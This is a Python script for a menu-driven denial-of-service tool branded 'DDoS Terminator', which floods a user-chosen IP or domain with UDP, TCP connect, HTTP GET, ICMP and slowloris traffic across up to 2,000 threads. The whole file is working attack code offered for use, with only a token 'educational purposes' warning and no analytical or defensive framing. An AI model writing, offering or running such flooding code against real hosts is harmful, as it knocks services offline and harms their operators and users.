#!/usr/bin/env python3
import os
import sys
import socket
import random
import threading
import time
import requests
from termcolor import colored, cprint
import pyfiglet
from tqdm import tqdm

# ==============================================
# NUCLEAR ASCII ART
# ==============================================
def show_banner():
    os.system('clear')
    print(colored("""
██████╗ ███████╗██╗  ██╗███████╗███████╗██╗  ██╗
██╔══██╗██╔════╝╚██╗██╔╝╚════██║╚════██║╚██╗██╔╝
██████╔╝█████╗   ╚███╔╝  █████╔╝ █████╔╝ ╚███╔╝ 
██╔══██╗██╔══╝   ██╔██╗ ██╔═══╝  ╚═══██╗ ██╔██╗ 
██║  ██║███████╗██╔╝ ██╗███████╗██████╔╝██╔╝ ██╗
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝
    """, "red", attrs=["bold"]))
    
    print(colored(pyfiglet.figlet_format("DDOS TERMINATOR", font="doom"), end="")
    
    print(colored("""
╔════════════════════════════════════════════════╗
║ █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█ ║
║ █ ██╗  ██╗███████╗██╗  ██╗███████╗██████╗   █ ║
║ █ ██║  ██║██╔════╝██║  ██║██╔════╝██╔══██╗  █ ║
║ █ ███████║█████╗  ███████║█████╗  ██████╔╝  █ ║
║ █ ██╔══██║██╔══╝  ██╔══██║██╔══╝  ██╔══██╗  █ ║
║ █ ██║  ██║███████╗██║  ██║███████╗██║  ██║  █ ║
║ █ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝  █ ║
║ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ║
╚════════════════════════════════════════════════╝
    """, "yellow"))

# ==============================================
# DEATH STAR DDOS SYSTEM
# ==============================================
class DeathStarDDoS:
    def __init__(self):
        self.attack_running = False
        self.threads = []
        self.packets_sent = 0
        self.attack_start = 0
        self.target = ""
        
        # Enhanced attack methods
        self.methods = {
            "UDP": self.udp_tsunami,
            "SYN": self.syn_avalanche,
            "HTTP": self.http_meteor,
            "ICMP": self.icmp_storm,
            "SLOW": self.slowloris_nuke
        }
        
        # Advanced configuration
        self.config = {
            "max_threads": 2000,
            "packet_size": 65500,
            "timeout": 5
        }
    
    def show_attack_menu(self):
        print(colored("""
╔════════════════════════════════════════════════╗
║                DDOS ATTACK METHODS             ║
╠════════════════════════════════════════════════╣
║ 1. UDP TSUNAMI     - Flood with UDP packets    ║
║ 2. SYN AVALANCHE   - SYN flood attack          ║
║ 3. HTTP METEOR     - HTTP request flood        ║
║ 4. ICMP STORM      - Ping of death             ║
║ 5. SLOWLORIS NUKE  - Slow connection attack    ║
║ 0. BACK TO MAIN MENU                           ║
╚════════════════════════════════════════════════╝
        """, "cyan"))
    
    def get_target(self):
        print(colored("\n[!] WARNING: ILLEGAL WITHOUT PERMISSION!", "red", attrs=["blink"]))
        print(colored("[!] For educational purposes only!\n", "yellow"))
        
        self.target = input(colored("[🌐] TARGET IP/DOMAIN: ", "cyan"))
        if not self.validate_target(self.target):
            print(colored("[-] Invalid target!", "red"))
            return False
        
        try:
            socket.gethostbyname(self.target)
            return True
        except:
            print(colored("[-] Cannot resolve target!", "red"))
            return False
    
    def validate_target(self, target):
        try:
            if any(c.isalpha() for c in target):
                return True  # Domain name
            socket.inet_aton(target)
            return True  # Valid IP
        except:
            return False
    
    def prepare_attack(self):
        print(colored("\n[⚙️] CONFIGURING NUCLEAR PAYLOAD...", "yellow"))
        
        duration = int(input(colored("[⏱️] DURATION (seconds): ", "cyan")))
        threads = int(input(colored("[🧵] THREADS (1-2000): ", "cyan")))
        method = input(colored("[💣] METHOD (UDP/SYN/HTTP/ICMP/SLOW): ", "cyan")).upper()
        
        if method not in self.methods:
            print(colored("[-] Invalid method!", "red"))
            return None, None, None
        
        threads = max(1, min(threads, self.config["max_threads"]))
        return duration, threads, method
    
    def launch_attack(self):
        if not self.get_target():
            return
        
        duration, threads, method = self.prepare_attack()
        if not all([duration, threads, method]):
            return
        
        print(colored(f"\n[🔥] FIRING DEATH STAR AT {self.target}", "red", attrs=["bold"]))
        print(colored(f"[⚡] METHOD: {method} | THREADS: {threads} | DURATION: {duration}s", "yellow"))
        
        # Countdown animation
        for i in tqdm(range(5, 0, -1), desc=colored("ACTIVATING WEAPONS", "red"), ncols=100):
            time.sleep(0.5)
        
        # Start attack
        self.attack_running = True
        self.packets_sent = 0
        self.attack_start = time.time()
        
        for _ in range(threads):
            t = threading.Thread(target=self.methods[method], args=(duration,))
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        # Monitor attack
        self.monitor_attack(duration)
        
        # Cleanup
        self.attack_running = False
        for t in self.threads:
            t.join()
        
        print(colored("\n[✅] TARGET ELIMINATED!", "green", attrs=["bold"]))
        print(colored(f"[📊] TOTAL PACKETS: {self.packets_sent:,}", "cyan"))
        print(colored(f"[⏱️] ATTACK DURATION: {time.time() - self.attack_start:.2f}s", "cyan"))
    
    def monitor_attack(self, duration):
        start = time.time()
        while time.time() - start < duration and self.attack_running:
            elapsed = int(time.time() - start)
            remaining = duration - elapsed
            print(colored(f"\r[☠️] ATTACKING | {elapsed}s/{duration}s | {self.packets_sent:,} packets", "red"), end="")
            time.sleep(0.1)
        print()
    
    # ==============================================
    # ATTACK METHODS
    # ==============================================
    def udp_tsunami(self, duration):
        timeout = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(self.config["packet_size"])
        
        while time.time() < timeout and self.attack_running:
            try:
                sock.sendto(payload, (self.target, random.randint(1, 65535)))
                self.packets_sent += 1
            except:
                pass
        sock.close()
    
    def syn_avalanche(self, duration):
        timeout = time.time() + duration
        while time.time() < timeout and self.attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.config["timeout"])
                s.connect((self.target, 80))
                s.close()
                self.packets_sent += 1
            except:
                pass
    
    def http_meteor(self, duration):
        timeout = time.time() + duration
        url = f"http://{self.target}/"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml",
            "Connection": "keep-alive"
        }
        
        while time.time() < timeout and self.attack_running:
            try:
                requests.get(url, headers=headers, timeout=self.config["timeout"])
                self.packets_sent += 1
            except:
                pass
    
    def icmp_storm(self, duration):
        timeout = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        
        while time.time() < timeout and self.attack_running:
            try:
                sock.sendto(random._urandom(1000), (self.target, 0))
                self.packets_sent += 1
            except:
                pass
        sock.close()
    
    def slowloris_nuke(self, duration):
        timeout = time.time() + duration
        while time.time() < timeout and self.attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.target, 80))
                s.send(f"GET / HTTP/1.1\r\nHost: {self.target}\r\n".encode())
                while time.time() < timeout and self.attack_running:
                    s.send("X-a: b\r\n".encode())
                    time.sleep(10)
                s.close()
                self.packets_sent += 1
            except:
                pass

# ==============================================
# CREDITS
# ==============================================
def show_credits():
    print(colored("""
╔════════════════════════════════════════════════╗
║                SPECIAL THANKS TO               ║
╠════════════════════════════════════════════════╣
║ REXZZX - Main Developer                        ║
║ Anonymous Hackers Worldwide                    ║
║ Termux Developer Community                     ║
║ Python Security Researchers                    ║
║ All White Hat Hackers                          ║
╚════════════════════════════════════════════════╝
    """, "magenta"))

# ==============================================
# MAIN EXECUTION
# ==============================================
if __name__ == "__main__":
    try:
        show_banner()
        print(colored("\n[⚡] DEATH STAR DDOS TERMINATOR V5 ACTIVATED", "red", attrs=["bold"]))
        
        death_star = DeathStarDDoS()
        
        while True:
            death_star.show_attack_menu()
            choice = input(colored("\n[?] SELECT WEAPON (1-5/0): ", "yellow"))
            
            if choice == "0":
                break
            elif choice in ["1", "2", "3", "4", "5"]:
                method_map = {"1": "UDP", "2": "SYN", "3": "HTTP", "4": "ICMP", "5": "SLOW"}
                death_star.launch_attack()
                input(colored("\n[!] PRESS ENTER TO CONTINUE...", "yellow"))
            else:
                print(colored("[-] INVALID SELECTION!", "red"))
        
        show_credits()
        print(colored("\n[👋] DEATH STAR POWERING DOWN...", "green"))
        
    except KeyboardInterrupt:
        print(colored("\n[!] ATTACK ABORTED BY USER", "red"))
    except Exception as e:
        print(colored(f"\n[💀] FATAL ERROR: {str(e)}", "red"))
    finally:
        print(colored("\n[✨] THANKS FOR USING REXZZX DDOS TERMINATOR", "cyan"))
